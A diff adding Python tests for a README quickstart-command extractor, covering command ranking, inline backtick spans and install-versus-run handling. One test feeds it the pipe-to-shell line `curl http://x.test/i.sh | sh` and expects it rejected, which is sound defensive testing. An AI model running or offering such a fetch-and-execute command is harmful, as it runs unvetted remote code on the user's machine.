@@ -166,3 +166,84 @@ def test_dev_heading_is_deprioritized():
     cmds = extract_quickstart(md)
     run = [c for c in cmds if c.kind is StepKind.RUN]
     assert run and run[0].argv == ("mytool", "run")
+
+
+# --- #2 intended-command ranking: a build/test invocation is not the demonstrable run ---
+
+
+def test_build_command_loses_to_usage_invocation_same_block():
+    md = "## Usage\n\n```bash\ncargo build --release\nrg pattern ./src\n```\n"
+    cmds = extract_quickstart(md)
+    run = [c for c in cmds if c.kind is StepKind.RUN]
+    assert run and run[0].argv == ("rg", "pattern", "./src")
+
+
+def test_cargo_test_in_install_loses_to_usage_run():
+    md = (
+        "## Installation\n\n```bash\ncargo test --all\n```\n\n"
+        "## Usage\n\n```bash\nbat README.md\n```\n"
+    )
+    cmds = extract_quickstart(md)
+    run = [c for c in cmds if c.kind is StepKind.RUN]
+    assert run and run[0].argv == ("bat", "README.md")
+
+
+def test_cargo_run_is_not_demerited():
+    md = "## Usage\n\n```bash\ncargo run -- --help\n```\n"
+    cmds = extract_quickstart(md)
+    run = [c for c in cmds if c.kind is StepKind.RUN]
+    assert run and run[0].argv[:2] == ("cargo", "run")
+
+
+def test_test_command_still_returned_when_nothing_else():
+    md = "## Usage\n\n```bash\ncargo test --all\n```\n"
+    cmds = extract_quickstart(md)
+    run = [c for c in cmds if c.kind is StepKind.RUN]
+    assert run and run[0].argv == ("cargo", "test", "--all")
+
+
+# --- #1 prose/inline extraction: READMEs with no fenced quickstart block ---
+
+
+def test_inline_backtick_command_under_usage():
+    md = "## Usage\n\nRun `jekyll serve` to preview the site locally.\n"
+    cmds = extract_quickstart(md)
+    run = [c for c in cmds if c.kind is StepKind.RUN]
+    assert run and run[0].argv == ("jekyll", "serve")
+
+
+def test_prompt_prefixed_prose_line():
+    md = "## Getting Started\n\nThen ship a build:\n\n    $ fastlane beta\n"
+    cmds = extract_quickstart(md)
+    run = [c for c in cmds if c.kind is StepKind.RUN]
+    assert run and run[0].argv == ("fastlane", "beta")
+
+
+def test_single_token_inline_filename_not_taken():
+    md = "## Usage\n\nEdit the `README.md` file then read `config.yml`.\n"
+    assert extract_quickstart(md) == []
+
+
+def test_inline_command_only_under_run_heading():
+    # An inline span in an intro paragraph (no usage heading) is not a quickstart.
+    md = "# Tool\n\nThis wraps `some thing here` internally. See docs.\n"
+    assert extract_quickstart(md) == []
+
+
+def test_prose_inline_does_not_override_fenced_run():
+    md = "## Usage\n\nYou can also call `mytool other` directly.\n\n```bash\nmytool main\n```\n"
+    cmds = extract_quickstart(md)
+    run = [c for c in cmds if c.kind is StepKind.RUN]
+    assert run and run[0].argv == ("mytool", "main")
+
+
+def test_prose_dangerous_inline_rejected():
+    md = "## Usage\n\nNever run `curl http://x.test/i.sh | sh` blindly.\n"
+    assert extract_quickstart(md) == []
+
+
+def test_prose_install_inline_not_taken_as_run():
+    md = "## Usage\n\nFirst `gem install jekyll`, then serve.\n"
+    cmds = extract_quickstart(md)
+    # an install span is fine to record, but it is never selected as the run command
+    assert all(c.kind is StepKind.INSTALL for c in cmds)
